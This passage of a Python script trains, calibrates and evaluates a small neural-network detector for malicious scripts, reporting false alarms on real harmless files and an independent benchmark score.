    samples = [x for x in samples if not (x[1] in seen or seen.add(x[1]))]
    rnd.shuffle(samples)
    k1, k2 = int(len(samples) * 0.8), int(len(samples) * 0.9)
    train_set, val_set, test_set = samples[:k1], samples[k1:k2], samples[k2:]

    say(f"training on {len(train_set)} samples ({FEATURES} features, {HIDDEN} hidden units)")
    W1, b1, W2, b2 = train(train_set, epochs=epochs, seed=seed, throttle=throttle, gpu=gpu)

    # write to a temporary file first, check it loads, then move it into place
    tmp = out_path.with_name(out_path.stem + ".tmp.npz")
    save(W1, b1, W2, b2, tmp)
    temp = fit_temperature(aimodel.Model(tmp), val_set)
    save(W1, b1, W2, b2, tmp, temp)
    say(f"calibration: temperature {temp} (higher = the model was over-confident on data it had not seen)")
    aimodel.check_file(tmp)
    os.replace(tmp, out_path)
    model = aimodel.Model(out_path)
    say(f"saved {out_path} ({out_path.stat().st_size / 1024:.0f} KB, int8 weights; float32 would be {(W1.size + W2.size) * 4 / 1024:.0f} KB)")

    conf = evaluate(model, test_set, "held-out generated + real samples (same generators as training: an optimistic number)")
    correct = int(np.trace(conf))
    say("confusion (rows = truth, columns = guess): " + str(LABELS))
    say(str(conf))
    false_alarms, real_n = 0, len(real_test)
    if real_test:
        flagged = [(p, model.predict(t)) for p, t in real_test]
        bad = [(p, r) for p, r in flagged if r["label"] != "benign" and r["confidence"] >= 0.8]
        false_alarms = len(bad)
        say(f"harmless REAL files never seen in training: {real_n}, wrongly flagged at >=80%: {false_alarms} ({100 * false_alarms / real_n:.2f}%)")
        for p, r in bad[:8]:
            say(f"    {r['label']} {round(r['confidence'], 2)} {p}")

    say("independent benchmark (hand-written scripts, never used for training):")
    bench = benchmark(model)
    say(f"  {bench['benchmark_accuracy']}% right ({bench['benchmark_false_alarms']} false alarms of {bench['benchmark_benign']} harmless, {bench['benchmark_missed']} missed of {bench['benchmark_malicious']} malicious)")
    digest = hashlib.sha256(out_path.read_bytes()).hexdigest()
    report = {**bench, "temperature": temp, "note": "test_accuracy uses generated samples (optimistic); benchmark_* is the honest score",
        "trained_at": time.time(), "seed": seed, "epochs": epochs, "samples": len(train_set),
        "real_files": len(real), "test_accuracy": round(100 * correct / max(len(test_set), 1), 2),
        "false_alarms": false_alarms, "real_test_files": real_n, "sha256": digest, "size_kb": round(out_path.stat().st_size / 1024),
    }
    out_path.with_name("train_info.json").write_text(json.dumps(report, indent=2), encoding="utf-8")
    return report


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--benign", action="append", default=[], help="folder of harmless scripts (repeatable)")
    ap.add_argument("--malicious", action="append", default=[], help="folder of malicious scripts; sub-folders named like the classes set the class, otherwise 'downloader'")
    ap.add_argument("--per-class", type=int, default=900)
    ap.add_argument("--epochs", type=int, default=25)
    ap.add_argument("--seed", type=int, default=SEED)
    ap.add_argument("--out", default=str(aimodel.BUNDLED_MODEL))
    a = ap.parse_args()
    run_training(a.benign, a.malicious, a.per_class, a.epochs, a.out, a.seed)


if __name__ == "__main__":
    sys.exit(main())
